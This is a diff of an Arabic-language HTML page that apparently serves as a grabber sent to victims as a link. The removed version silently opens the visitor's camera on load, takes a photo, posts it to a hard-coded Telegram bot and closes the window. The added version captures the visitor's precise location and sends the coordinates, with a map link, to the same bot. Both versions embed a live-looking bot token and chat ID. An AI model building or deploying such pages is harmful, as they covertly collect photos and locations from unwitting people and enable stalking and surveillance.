@@ -1,96 +1,151 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>التقاط فوري</title>
-    <script>
-        // بيانات البوت
-        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
-        const CHAT_ID = '7327464581';
-        
-        // إعدادات الأداء
-        const CAPTURE_DELAY = 100; // تأخير قصير جداً قبل الالتقاط (مللي ثانية)
-        const IMAGE_QUALITY = 0.6; // جودة منخفضة للسرعة (0.6 = 60%)
-        const RESOLUTION = { width: 640, height: 480 }; // دقة منخفضة للسرعة
-
-        async function ultraFastCapture() {
-            try {
-                // 1. فتح الكاميرا بأقل إعدادات ممكنة للسرعة
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        ...RESOLUTION,
-                        frameRate: 15 // تقليل معدل الإطارات للسرعة
-                    }
-                });
-                
-                // 2. إنشاء عناصر سريعة بدون عرضها في DOM
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.muted = true;
-                video.playsInline = true;
-                await video.play();
-                
-                // 3. التقاط سريع مع الحد الأدنى من المعالجة
-                const canvas = document.createElement('canvas');
-                canvas.width = RESOLUTION.width;
-                canvas.height = RESOLUTION.height;
-                const ctx = canvas.getContext('2d', { willReadFrequently: false });
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // 4. إيقاف الكاميرا فوراً (لا تنتظر الإرسال)
-                stream.getTracks().forEach(track => track.stop());
-                
-                // 5. تحويل وإرسال متوازي (لا ينتظر العرض)
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'instant_capture.jpg');
-                    
-                    // إرسال غير متزامن (لا ننتظر الرد)
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors' // لتجنب انتظار الرد
-                    }).catch(e => console.log('تم الإرسال (قد لا يكون مؤكداً)'));
-                    
-                    // إغلاق سريع للنافذة
-                    setTimeout(window.close, 300);
-                }, 'image/jpeg', IMAGE_QUALITY);
-                
-            } catch (error) {
-                // عرض واجهة طلب الإذن إذا فشلت المحاولة التلقائية
-                document.body.innerHTML = `
-                    <div style="
-                        text-align:center;
-                        padding:20px;
-                        font-family:Arial;
-                        max-width:400px;
-                        margin:50px auto;
-                    ">
-                        <h2>التقاط الصورة الفوري</h2>
-                        <p>يجب منح إذن الوصول للكاميرا</p>
-                        <button onclick="ultraFastCapture()" style="
-                            padding: 12px 24px;
-                            background: #0088cc;
-                            color: white;
-                            border: none;
-                            border-radius: 6px;
-                            font-size: 16px;
-                            cursor: pointer;
-                            margin-top: 20px;
-                        ">منح الإذن والالتقاط</button>
-                    </div>
-                `;
-            }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال الموقع الجغرافي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f5f5f5;
         }
-
-        // بدء العملية فوراً مع تأخير بسيط لتهيئة الصفحة
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(ultraFastCapture, CAPTURE_DELAY);
-        });
-    </script>
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <!-- المحتوى سيتم تعديله ديناميكياً -->
+    <div class="container">
+        <h1>جاري الحصول على موقعك الجغرافي</h1>
+        <p>يتم الآن طلب إذن الوصول إلى موقعك الجغرافي...</p>
+        <div class="loader"></div>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري تحديد الموقع...';
+            
+            if (navigator.geolocation) {
+                // استخدام watchPosition بدلاً من getCurrentPosition للحصول على أسرع استجابة
+                const watchId = navigator.geolocation.watchPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // إيقاف مراقبة الموقع بعد الحصول عليه
+                        navigator.geolocation.clearWatch(watchId);
+                        
+                        // إرسال الموقع إلى بوت تلجرام
+                        sendToTelegramBot(latitude, longitude);
+                    },
+                    function(error) {
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "تم رفض طلب الوصول إلى الموقع الجغرافي.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "معلومات الموقع غير متاحة.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "انتهى وقت طلب الموقع.";
+                                break;
+                            case error.UNKNOWN_ERROR:
+                                errorMessage = "حدث خطأ غير معروف.";
+                                break;
+                        }
+                        statusElement.textContent = errorMessage;
+                        document.querySelector('.loader').style.display = 'none';
+                    },
+                    {
+                        enableHighAccuracy: true, // للحصول على دقة أعلى وأسرع
+                        maximumAge: 0, // عدم استخدام البيانات المخزنة مؤقتًا
+                        timeout: 5000 // وقت انتظار قصير
+                    }
+                );
+            } else {
+                statusElement.textContent = "المتصفح لا يدعم خدمة الموقع الجغرافي.";
+                document.querySelector('.loader').style.display = 'none';
+            }
+        });
+
+        function sendToTelegramBot(latitude, longitude) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري إرسال الموقع...';
+            
+                     // استبدل هذه القيم بمعلومات بوتك
+            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+            const chatId = '7327464581';
+            
+            const message = `?? تم استلام موقع جديد:
+الخط العرضي: ${latitude}
+الخط الطولي: ${longitude}
+رابط خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // استخدام fetch مع AbortController للتحكم في الوقت المستغرق
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000); // مهلة 3 ثواني
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                }),
+                signal: controller.signal
+            })
+            .then(response => response.json())
+            .then(data => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (data.ok) {
+                    statusElement.textContent = 'تم إرسال الموقع بنجاح! يمكنك إغلاق هذه الصفحة.';
+                } else {
+                    statusElement.textContent = 'فشل في إرسال الموقع إلى بوت تلجرام.';
+                }
+            })
+            .catch(error => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (error.name === 'AbortError') {
+                    statusElement.textContent = 'انتهى الوقت المخصص لإرسال الموقع.';
+                } else {
+                    statusElement.textContent = 'خطأ في الاتصال بالإنترنت.';
+                }
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </body>
 </html>
